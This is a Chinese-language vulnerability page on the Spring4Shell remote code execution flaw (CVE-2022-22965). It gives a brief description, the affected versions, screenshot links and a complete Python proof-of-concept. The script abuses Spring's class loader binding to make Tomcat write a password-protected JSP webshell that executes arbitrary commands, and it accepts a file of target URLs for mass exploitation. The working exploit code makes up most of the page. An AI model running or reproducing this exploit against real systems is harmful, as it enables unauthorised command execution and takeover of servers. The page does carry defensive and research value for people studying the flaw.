# Spring Core JDK9+ Spring4Shell远程命令执行漏洞 *CVE*-2022-22965

## 漏洞描述

Spring是目前世界上最受欢迎的JavaEE轻量级开源框架，是Java世界最为成功的框架之一。专注于简化Java企业级应用开发的难度、缩短开发周期。该框架存在远程代码执行漏洞。结合JDK9及以上新版本的特性可以实现对历史漏洞补丁的绕过从而实现远程代码执行。

## 漏洞影响

<a-checkbox checked>JDK 9.0+, Spring 框架, 衍生框架spring-beans-*.jar</a-checkbox></br>

## 漏洞复现

![img](../../../.vuepress/public/img/1648707142327-ac12fca3-0b71-4d7a-9a63-2afb632b2478.png)

![img](../../../.vuepress/public/img/1648707153387-68e94738-b82e-491b-b5f2-aea83a44326c.png)

![img](../../../.vuepress/public/img/1648707194053-66b17ce7-78f2-44fa-9030-706812093cf1.png)

![img](../../../.vuepress/public/img/1648707221623-63f0b8fd-68fc-40b3-93ab-3c849f549c7d.png)

![img](../../../.vuepress/public/img/1648707223946-3cd95600-be21-4bb8-b97d-0c7235f18e55.png)

![img](../../../.vuepress/public/img/1648707238287-438fa60f-0b47-4045-817e-1815e84336b0.png)

![img](../../../.vuepress/public/img/1648707240439-c13c2a1c-a1b8-4765-b3cd-bec110e89a91.png)



## 漏洞POC

```php
#coding:utf-8

import requests
import argparse
from urllib.parse import urljoin

def Exploit(url):
    headers = {"suffix":"%>//",
                "c1":"Runtime",
                "c2":"<%",
                "DNT":"1",
                "Content-Type":"application/x-www-form-urlencoded"

    }
    data = "class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20if(%22j%22.equals(request.getParameter(%22pwd%22)))%7B%20java.io.InputStream%20in%20%3D%20%25%7Bc1%7Di.getRuntime().exec(request.getParameter(%22cmd%22)).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%20while((a%3Din.read(b))!%3D-1)%7B%20out.println(new%20String(b))%3B%20%7D%20%7D%20%25%7Bsuffix%7Di&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT&class.module.classLoader.resources.context.parent.pipeline.first.prefix=tomcatwar&class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat="
    try:

        go = requests.post(url,headers=headers,data=data,timeout=15,allow_redirects=False, verify=False)
        shellurl = urljoin(url, 'tomcatwar.jsp')
        shellgo = requests.get(shellurl,timeout=15,allow_redirects=False, verify=False)
        if shellgo.status_code == 200:
            print(f"漏洞存在，shell地址为:{shellurl}?pwd=j&cmd=whoami")
    except Exception as e:
        print(e)
        pass




def main():
    parser = argparse.ArgumentParser(description='Srping-Core Rce.')
    parser.add_argument('--file',help='url file',required=False)
    parser.add_argument('--url',help='target url',required=False)
    args = parser.parse_args()
    if args.url:
        Exploit(args.url)
    if args.file:
        with open (args.file) as f:
            for i in f.readlines():
                i = i.strip()
                Exploit(i)

if __name__ == '__main__':
    main()
```

## 参考文章

<a-alert type="success" message="https://github.com/craig/SpringCore0day" description="" showIcon>
</a-alert>
<br/>